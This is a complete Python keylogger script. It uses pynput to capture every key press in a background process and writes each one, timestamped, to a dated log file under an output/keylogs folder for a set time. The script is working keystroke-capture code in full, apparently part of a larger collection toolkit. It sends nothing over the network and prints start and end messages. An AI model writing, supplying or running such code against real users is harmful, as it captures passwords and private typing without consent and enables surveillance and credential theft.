from pynput.keyboard import Listener
import logging
import os
import datetime
import multiprocessing


def keylog_action(source_dir, log_dir, filename):

    os.makedirs(source_dir, exist_ok=True)
    logging.basicConfig(filename=(log_dir + filename),
                        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()


def keylog(timeout_seconds=15):
    source_dir = os.path.dirname(os.path.abspath(__file__))
    log_dir = os.path.join(source_dir, "..\\output\\keylogs\\")
    os.makedirs(log_dir, exist_ok=True)

    filename = "keylog_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
    process = multiprocessing.Process(
        target=keylog_action, args=(source_dir, log_dir, filename))

    process.start()
    print("Keylog started.")
    process.join(timeout=timeout_seconds)

    if process.is_alive():
        process.terminate()
        process.join()

    print("Keylog ended.")
    return log_dir + filename


def main():
    path = keylog(20)
    print(path)


if __name__ == "__main__":
    main()
